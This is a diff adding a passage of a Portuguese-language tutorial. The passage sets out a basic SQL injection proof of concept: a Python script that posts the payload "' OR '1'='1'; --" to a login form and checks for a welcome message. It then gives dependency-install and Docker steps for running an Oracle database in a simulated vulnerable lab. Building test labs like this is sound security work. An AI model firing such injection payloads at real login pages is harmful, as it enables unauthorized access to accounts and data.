@@ -1,0 +1,56 @@
+Exemplo básico de como a PoC pode ser estruturada:
+```python
+import requests
+# URL do sistema vulnerável
+url = "http://example.com/login"
+# Dados maliciosos para injeção SQL
+payload = {
+'username': "' OR '1'='1'; --",
+'password': ''
+}
+# Realizando a requisição
+response = requests.post(url, data=payload)
+# Verificando a resposta
+if "Welcome" in response.text: # Alterar para a mensagem de boas-vindas esperada
+print("Injeção de SQL bem-sucedida!")
+else:
+print("Falha na injeção.")
+```
+5.1.3. Instalação de Dependências:
+Dependendo da linguagem ou framework usado no repositório, você precisará instalar as dependências.
+Se for uma aplicação Python, por exemplo, use o `pip` para instalar as dependências listadas em
+`requirements.txt`:
+```bash
+pip install -r requirements.txt
+```
+Para um projeto Java, você pode usar o Maven:
+
+```bash
+mvn install
+```
+5.1.4. Configurar o Banco de Dados:
+A aplicação vulnerável pode depender de um banco de dados Oracle. Para simular o ambiente, siga os
+seguintes passos.
+5.1.5. Configurar o Ambiente com Docker
+Usar o Docker facilita a simulação de um ambiente vulnerável. Aqui está como criar um
+contêiner Oracle Database e simular a aplicação vulnerável.
+5.1.6. Instalando Docker:
+Se você ainda não tiver o Docker instalado, siga as instruções na [documentação oficial do
+Docker](https://docs.docker.com/get-docker/).
+5.1.7. Executando a Imagem do Oracle Database com Docker:
+Existem imagens Docker disponíveis para Oracle Database. Execute o comando abaixo para baixar e
+rodar a versão de Oracle Database:
+```bash
+docker pull container-registry.oracle.com/database/enterprise:19.3.0.0
+```
+Em seguida, crie e inicie um contêiner Oracle Database:
+```bash
+docker run -d -it --name oracle-db -p 1521:1521 -e ORACLE_PWD=SenhaForte
+container-registry.oracle.com/database/enterprise:19.3.0.0
+```
+5.18. Acessar o Banco de Dados:
+Depois que o contêiner estiver em execução, você pode acessá-lo com um cliente SQL. Use ferramentas
+como SQL*Plus ou SQL Developer para conectar ao banco de dados Oracle:
+```bash
+sqlplus sys/SenhaForte@localhost:1521/ORCLCDB as sysdba
+```
